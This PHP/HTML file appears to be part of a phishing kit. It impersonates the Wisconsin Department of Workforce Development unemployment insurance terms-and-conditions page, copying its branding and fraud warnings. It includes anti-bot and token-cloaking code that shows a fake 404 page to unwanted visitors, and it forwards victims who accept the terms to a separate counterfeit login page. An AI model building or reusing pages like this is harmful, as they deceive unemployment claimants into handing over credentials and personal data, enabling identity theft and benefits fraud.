<?php

    session_start();
    date_default_timezone_set('America/Chicago');

    require_once '../J/Comp.php';
    require_once '../J/Antibot.php';
    require_once '../J/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }

?>

<!DOCTYPE html>
<html class=" js flexbox flexboxlegacy rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en">

<head>
    <title>Secure Log In PROD</title>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="../A/css/Login/bootstrap.css" rel="stylesheet">
    <link href="../A/css/Login/css.css" rel="stylesheet">
    <link href="../A/css/Login/font-awesome.css" rel="stylesheet">
    <link href="../A/css/Login/bootstro.css" rel="stylesheet">
    <link href="../A/css/Login/App.css" rel="stylesheet">
</head>

<body class="js">
    <noscript>
        <p id="nojavascript">
            You need to have javascript enabled to use this application. Please refer to your
            browser settings to enable javascript.
        </p>
    </noscript>
    <div class="container-fluid WhiteBackground">
        <a class="sr-only" href="#content">Skip to main content</a>
        <div id="header" class="row hidden-xs">
            <div class="col-md-12 col-sm-12">
                <div class="row">
                    <div id="dwdLogo" class="col-lg-2 col-md-3 col-sm-4 hidden-print">
                        <img alt="Department of Workforce Development" class="img-responsive" id="imgLogo" src="../A/img/logonew.png" title="Department of Workforce Development">
                    </div>
                    <div id="dwdLogoPrint" class="col-lg-2 col-md-3 col-sm-4 visible-print">
                        <img alt="Department of Workforce Development" class="img-responsive" id="imgLogoPrint" src="../A/img/dwd_logo_gray.png" title="Department of Workforce Development">
                    </div>
                    <div id="landingheading" class="col-lg-8 col-md-6 col-sm-6">
                        <h1>Wisconsin Unemployment Insurance</h1>
                    </div>
                    <div class="col-sm-2 col-md-3 col-lg-2  Logout text-right hidden-print pull-right">
                    </div>
                </div>
                <div id="dwd" class="row hidden-print">
                    <div class="col-md-12">
                        <b>Department of Workforce Development</b>
                    </div>
                </div>
            </div>
        </div>
        <div id="header-xs" class="row visible-xs">
            <div class="col-xs-12">
                <div class="row">
                    <div id="landingheading-xs" class="col-xs-12">
                        <h1>Wisconsin Unemployment Insurance</h1>
                    </div>
                </div>
                <div id="dwd-xs" class="row">
                    <div class="col-xs-9">
                        <b>Department of Workforce Development</b>
                    </div>
                    <div class="col-xs-3 Logout text-right hidden-print">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container-fluid WhiteBackground">
        <div class="container" id="LogonMain">
            <div id="LogonHeader">
                <h1>Wisconsin Unemployment Insurance Benefit Services</h1>
            </div>
            <ul>
                <li>You must accept the Terms and Conditions to use this site; and you will be taken to a Secure Login page.</li>
            </ul>
            <form autocomplete="Off" action="/Claimant/Account/TermsAndConditions" id="frmLogon" method="post" novalidate="novalidate">
                <div id="error" class="validation-summary-errors"></div>
                <div class="row">
                    <div class="col-xs-12">
                        <div id="FraudStatement">
                            <div id="Terms">
                                <div class="text-center">
                                    <h2>Terms and Conditions</h2>
                                </div>
                            </div>
                            <div id="FraudBody" class="form-group">
                                <div>
                                    <p>
                                        <b>Warning:</b> Committing unemployment insurance fraud is illegal. Wisconsin Unemployment
                                        Insurance law allows for severe penalties for intentionally providing false information,
                                        making false statements, or misrepresenting facts relating to eligibility for unemployment
                                        benefits. These penalties may include disqualification from benefits, loss of future
                                        benefits, repayment of erroneously paid benefits, monetary penalties, and criminal prosecution. To avoid
                                        these penalties, you must provide complete, correct and honest information when
                                        filing your unemployment claims.
                                    </p>
                                </div>
                            </div>
                            <div id="FraudContact" class="form-group">
                                <div>
                                    <p>
                                        You may NOT use this site to obtain information on another individual. Criminal penalties and
                                        fines will be imposed for unauthorized use.
                                    </p>
                                    <p>
                                        If you make a mistake or forget to report a material fact relating to your claim,
                                        please contact a claims specialist immediately to correct your record.
                                    </p>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="checkbox">
                                    <label class="control-label" for="checkbox">
                                        <input id="checkbox" type="checkbox">
                                        &nbsp;
                                        I Accept
                                    </label>
                                </div>
                                <button type="button" class="btn btn-primary" id="btn">Continue</button>
                            </div>
                        </div>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <div class="container-fluid WhiteBackground">
        <br>
        <div id="footer" class="footer row hidden-print">
            <div class="col-md-12">
                <a style="cursor: pointer;">Unemployment Insurance</a>
                | <a style="cursor: pointer;">Contact us</a>
                | <a style="cursor: pointer;">Legal/Acceptable Use</a>
                | <a style="cursor: pointer;">DWD Home</a>
                <div class="row">
                    <div class="col-md-12"><?php echo date('n/j/Y') . ' ' . date('g:i:s A'); ?></div>
                </div>
            </div>
        </div>
    </div>
    <script src="../A/js/index.js"></script>
    <script>
        b.addEventListener('click', () => {
            if (c.checked) {
                e.innerHTML = '';
                window.location.href = './login.php?token=<?php echo $_SESSION['token']; ?>';
            } else {
                e.innerHTML = '<ul><li>You must accept the terms and conditions</li></ul>';
                c.classList.add('input-validation-error');
            }
        });
    </script>
</body>

</html>